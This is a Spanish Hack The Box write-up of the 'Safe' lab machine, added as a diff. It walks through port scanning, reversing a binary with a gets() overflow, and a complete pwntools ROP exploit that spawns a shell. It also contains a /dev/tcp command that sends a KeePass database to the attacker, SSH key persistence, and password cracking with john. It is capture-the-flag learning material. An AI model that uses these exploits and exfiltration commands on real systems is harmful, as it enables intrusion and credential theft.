@@ -1,0 +1,349 @@
+I"�9<p>Este es un writeup de la maquina de Hack the Box safe, clasificada
+  como fácil, en la que tocaremos básicamente técnicas de análisis de
+  binarios, desarrollo de buffer overflow y creación de exploits en
+  python.</p>
+
+<hr />
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>En primer lugar realizamos una enumeración de la maquina con nmap y
+descubrimos que tiene abiertos tres puertos el 22, el 80 y el 1337.</p>
+
+<blockquote>
+  <p>Nmap 7.92 scan initiated Mon May 30 19:11:17 2022 as: nmap -sS -p- -n -Pn –min-rate 5000 -oG allports 10.10.10.147
+Host: 10.10.10.147 ()	Status: Up
+Host: 10.10.10.147 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/open/tcp//waste///	Ignored State: closed (65532)
+Nmap done at Mon May 30 19:11:30 2022 – 1 IP address (1 host up) scanned in 13.29 seconds</p>
+</blockquote>
+
+<p>Realizamos un reconocimiento de versiones y vemos que en el puerto 1337
+se esta ejecutando una aplicación.</p>
+
+<blockquote>
+  <p>Nmap 7.92 scan initiated Thu Jun  9 19:48:36 2022 as:
+nmap -sCV -p22,80,1337 -oN Versions -Pn 10.10.10.147
+Nmap scan report for 10.10.10.147
+Host is up (0.12s latency).</p>
+</blockquote>
+
+<p>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
+|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
+|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+|<em>http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP: 
+|     13:48:54 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
+|   DNSVersionBindReqTCP: 
+|     13:48:49 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
+|   GenericLines: 
+|     13:48:37 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back?
+|   GetRequest: 
+|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? GET / HTTP/1.0
+|   HTTPOptions: 
+|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? OPTIONS / HTTP/1.0
+|   Help: 
+|     13:49:00 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? HELP
+|   NULL: 
+|     13:48:37 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|   RPCCheck: 
+|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|   RTSPRequest: 
+|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? OPTIONS / RTSP/1.0
+|   SSLSessionReq, TerminalServerCookie: 
+|     13:49:00 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back?
+|   TLSSessionReq: 
+|     13:49:01 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
+|</em>    What do you want me to echo back?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.92%I=7%D=6/9%Time=62A2327B%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,3E,”\x2013:48:37\x20up\x202\x20min,\x20\x200\x20users,\x20\x20load\x2
+SF:0average:\x200.00,\x200.00,\x200.00\n”)%r(GenericLines,63,”\x2013:48
+SF::37\x20up\x202\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200<br />
+SF:.00,\x200.00,\x200.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ech
+SF:o\x20back\?\x20\r\n”)%r(GetRequest,71,”\x2013:48:44\x20up\x202\x20min,<br />
+SF:x20\x200\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.00
+SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20/
+SF:\x20HTTP/1.0\r\n”)%r(HTTPOptions,75,”\x2013:48:44\x20up\x202\x20min,\x
+SF:20\x200\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.00<br />
+SF:n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\x
+SF:20/\x20HTTP/1.0\r\n”)%r(RTSPRequest,75,”\x2013:48:44\x20up\x202\x20min
+SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.
+SF:00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTION
+SF:S\x20/\x20RTSP/1.0\r\n”)%r(RPCCheck,3E,”\x2013:48:44\x20up\x202\x20min
+SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.
+SF:00\n”)%r(DNSVersionBindReqTCP,3E,”\x2013:48:49\x20up\x203\x20min,\x20\x
+SF:200\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.00\n”)%
+SF:r(DNSStatusRequestTCP,3E,”\x2013:48:54\x20up\x203\x20min,\x20\x200\x20u
+SF:sers,\x20\x20load\x20average:\x200.00,\x200.00,\x200.00\n”)%r(Help,6
+SF:7,”\x2013:49:00\x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x20av
+SF:erage:\x200.00,\x200.00,\x200.00\n\nWhat\x20do\x20you\x20want\x20me<br />
+SF:x20to\x20echo\x20back\?\x20HELP\r\n”)%r(SSLSessionReq,64,”\x2013:49:00<br />
+SF:x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200.00,
+SF:\x200.00,\x200.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x2
+SF:0back\?\x20\x16\x03\n”)%r(TerminalServerCookie,63,”\x2013:49:00\x20up\x
+SF:203\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200.00,\x200.
+SF:00,\x200.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?
+SF:\x20\x03\n”)%r(TLSSessionReq,64,”\x2013:49:01\x20up\x203\x20min,\x20\x2
+SF:00\x20users,\x20\x20load\x20average:\x200.00,\x200.00,\x200.00\n\nWh
+SF:at\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n”);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done at Thu Jun  9 19:50:13 2022 – 1 IP address (1 host up) scanned in 96.54 seconds</p>
+
+<p>Se realiza un reconocimiento de el puerto 80 vía http y encontramos un
+servidor apache aún sin configurar lo que nos da una idea de una máquina
+en producción.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_19_52_15.png" alt="Página en producción" /></p>
+
+<p>Vemos el código fuente de página y descubrimos un comentario. La
+aplicación ‘myapp’ puede ser descargada por el puerto 1337</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_19_52_54.png" alt="Código fuente de la pagina web" /></p>
+
+<p>Descargamos la aplicación, la ejecutamos y vemos que es una sencilla
+aplicación que nos devuelve date y un eco de lo que nosotros escribamos.</p>
+
+<hr />
+
+<h1 id="análisis-de-binarios">Análisis de binarios</h1>
+
+<p>Una vez descargada la aplicación vamos a analizarla, para ello usaremos
+Ghidra, una herramienta de ingeniería inversa de código abierto y
+gratuita desarrollada por la NSA. Cargamos la aplicación en Ghidra y
+analizamos las funciones, en la función main podemos ver el código hecho
+en C. Vemos que crea un buffer y usa gets y puts para el input de
+usuario. No tiene sanitización y posiblemente sea vulnerable a buffer
+overflow.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_19_58_40.png" alt="Análisis con Ghidra" /></p>
+
+<p>Vamos a usar la herramienta Gdb para comprobar si realmente es
+vulnerable. Creamos un string de 200 Aes con Python</p>
+<blockquote>
+  <p>Python3&gt;&gt;&gt;print("A"*200)\</p>
+</blockquote>
+
+<p>Copiamos el resultado, arrancamos gdb y cargamos</p>
+<blockquote>
+  <p>‘myapp’–&gt; gdb ./myapp\</p>
+</blockquote>
+
+<p>Ejecutamos myapp dentro de gdb y le pasamos las 200 Aes. En el resultado
+podemos ver el desbordamiento de pila.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_07_39.png" alt="Desbordamiento de pila" /></p>
+
+<p>Ahora necesitamos saber cuantos caracteres tenemos que inyectar para
+tomar el control del registro rsp (stack pointer), para ello creamos un
+patrón de 200 caracteres en gdb con pattern create 200 y lo inyectamos.
+Para averiguar el offset usamos:</p>
+<blockquote>
+  <p>gdb–&gt;pattern offset %rsp y nos da un offset de 120 (little endian)</p>
+</blockquote>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_11_37.png" alt="Calculo del offset de %rsp" /></p>
+
+<p>Tenemos que ver que protecciones tiene activadas para ello ejecutamos en gdb</p>
+<blockquote>
+  <p>gdb–&gt;checksec<br />
+Y vemos que tiene activada NX bit, protección contra escritura (DEP).
+Con esto no podemos usar la pila para cargar nuestro payload, tendremos
+que usar técnicas de Rop (Return-oriented programing). 
+<a href="https://shakuganz.com/2021/06/07/return-oriented-programming-rop-gnu-linux-version">Aquí</a> hay información al respecto.</p>
+</blockquote>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_25_04.png" alt="Registro rdi" /></p>
+
+<p>Sabemos que en el registro rdi se almacena la cadena “/usr/bin/uptime”, si logramos cargar en el registro rdi la cadena “/bin/sh”, podriamos
+hacer que nos diera una shell con el usuario con que se esté ejecutando el programa.<br />
+Como tenemos el control de rsp podemos cargar la cadena en rsp y luego moverlo a rdi pero eso no lo podemos hacer sin mas, necesitamos alguna función que tenga esos opcodes.<br />
+Buscando en ghidra encontramos que la función test tiene MOV RDI,RSP, después tiene un salto a R13.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_26_58.png" alt="Función Test en Ghidra" /></p>
+
+<p>Ahora necesitamos buscar gadgets para encontrar un pop a R13, en gdb usamos ropper:</p>
+<blockquote>
+  <p>gdb–&gt;ropper –search “pop r13”</p>
+</blockquote>
+
+<p>Nos devuelve la dirección de memoria con las llamadas a r13, r14, r15 y ret.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_30_18.png" alt="Búsqueda de pop r13" /></p>
+
+<p>Necesitamos la dirección de system para hacer la llamada a la cadena que vamos a guardar en rdi, la podemos conseguir haciendo un objectdump a myapp de la siguiente manera:</p>
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>objdump -D ./myapp</td>
+        <td>grep system</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p>Eso nos devuelve la dirección de system@plt</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_33_54.png" alt="Objdump a System" /></p>
+
+<p>Ya solo nos falta hacer la llamada a la función test para que inicie el proceso, la encontramos con:</p>
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>objdump -D ./myapp</td>
+        <td>grep test</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_35_30.png" alt="Objdump a Test" /></p>
+
+<p>Con esto ya lo tenemos todo, vamos a hacer un Exploit en Python.</p>
+
+<hr />
+
+<p>#Explotación</p>
+
+<p>Vamos a crear un exploit en python3 que haga la llamada al programa, desborde el buffer y meta las instrucciones en los registros.</p>
+
+<blockquote>
+  <p>#!/usr/bin/python3</p>
+</blockquote>
+
+<blockquote>
+  <p>from pwn import *</p>
+</blockquote>
+
+<blockquote>
+  <p>context(terminal=[‘tmux’, ‘new-window’])</p>
+</blockquote>
+
+<blockquote>
+  <p>context(os=’linux’, arch=’amd64’)</p>
+</blockquote>
+
+<blockquote>
+  <p>p = remote(“10.10.10.147”, 1337)</p>
+</blockquote>
+
+<blockquote>
+  <p>junk = b”A”*112 # a los 120 se restan los caracteres de /bin/sh\x00 = 7 caracteres + nullbyte = 8 caracteres</p>
+</blockquote>
+
+<blockquote>
+  <p>bin_sh = b”/bin/sh\x00”</p>
+</blockquote>
+
+<blockquote>
+  <p># gef➤  ropper –search “pop r13”</p>
+</blockquote>
+
+<blockquote>
+  <p># 0x0000000000401206: pop r13; pop r14; pop r15; ret;</p>
+</blockquote>
+
+<blockquote>
+  <p>pop_r13 = p64(0x401206)
+null = p64(0x0)</p>
+</blockquote>
+
+<blockquote>
+  <p>#  0000000000401040 <a href="mailto:system@plt">system@plt</a>:</p>
+</blockquote>
+
+<blockquote>
+  <p>#  401040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 404020 &lt;system@GLIBC_2.2.5&gt;</p>
+</blockquote>
+
+<blockquote>
+  <p>#  40116e:	e8 cd fe ff ff       	call   401040 <a href="mailto:system@plt">system@plt</a></p>
+</blockquote>
+
+<blockquote>
+  <p>system_plt = p64(0x401040)</p>
+</blockquote>
+
+<blockquote>
+  <p># 0000000000401152 <test>:</test></p>
+</blockquote>
+
+<blockquote>
+  <p>test = p64(0x401152)</p>
+</blockquote>
+
+<blockquote>
+  <p>payload = junk + bin_sh + pop_r13 + system_plt + null + null + test</p>
+</blockquote>
+
+<blockquote>
+  <p>p.sendline(payload)</p>
+</blockquote>
+
+<blockquote>
+  <p>p.interactive()</p>
+</blockquote>
+
+<p>Lanzamos el exploit y nos na una shell de usuario con el usuario user.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_20_36_47.png" alt="Shell de user" /></p>
+
+<p>Esta es una pseudo consola, lo  ideal seria poder usar una consola plena, revisamos el home del user y ya podemos ver la flag de user, ademas vemos que tiene .ssh con lo que podemos crear un par de claves en nuestro equipo y copiar la clave publica a la maquina safe como authorized_keys y asi poder entrar por ssh como user sin que nos pida la contraseña.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_21_13_17.png" alt="Authorized_keys" /></p>
+
+<hr />
+
+<p>#Escalada de privilegios</p>
+
+<p>Una vez dentro como user vemos que en el home tenemos un archivo de keepass y unas cuantas imágenes, nos las copiamos a nuestra maquina para poder enumerarlas. Como la máquina no tiene ni curl, ni wget ni python podemos intentar copiarlas mediante bussybox:</p>
+<blockquote>
+  <p>busybox httpd -f -p 8000</p>
+</blockquote>
+
+<p>o directamente con cat.</p>
+<blockquote>
+  <p>cat &lt; MyPasswords.kdbx &gt;/dev/tcp/tuip/puerto</p>
+</blockquote>
+
+<p>En nuestro equipo nos ponemos en escucha por netcat y metemos la salida al archivo MyPasswords.kdbx. También podemos usar scp para pasar los archivos.<br />
+Una vez en nuestro equipo las abrimos con keepassxc, nos pide una password y una keyfile.<br />
+Con keepass2john sacamos los hashes de Mypassword.kdbx y luego los pasamos por john the ripper, pero no tenemos suerte.<br />
+Volvemos a pasar el keepass2john pero esta vez a las imágenes.</p>
+<blockquote>
+  <p>keepass2john -k imagenes MyPassword.kdbx</p>
+</blockquote>
+
+<p>Con esto nos dará los hashes que luego intentaremos romper con johntheripper.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_21_00_41.png" alt="Hashes de las imágenes" /></p>
+
+<p>Al pasar los hashes por john uno de ellos nos da la contraseña, bullshit. Con ella y la imagen ya lo tenemos todo, ya podemos obtener la contraseña de root.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_21_03_39.png" alt="Contraseña de root" /></p>
+
+<p>Solo nos queda entrar por ssh como user y una vez dentro solo queda convertirse en root con la contraseña que hemos copiado y obtener la flag.</p>
+
+<p><img src="/assets/img/Safe/screensht_22-06-09_21_17_20.png" alt="Flag de root" /></p>
+
+<p>Hasta aquí la máquina Safe, una maquina clasificada como Easy por HTB pero yo la clasificaría como Medium por su Enumeración de binarios y su buffer overflow.</p>
+
+<p>Hasta otra¡</p>
+
+:ET
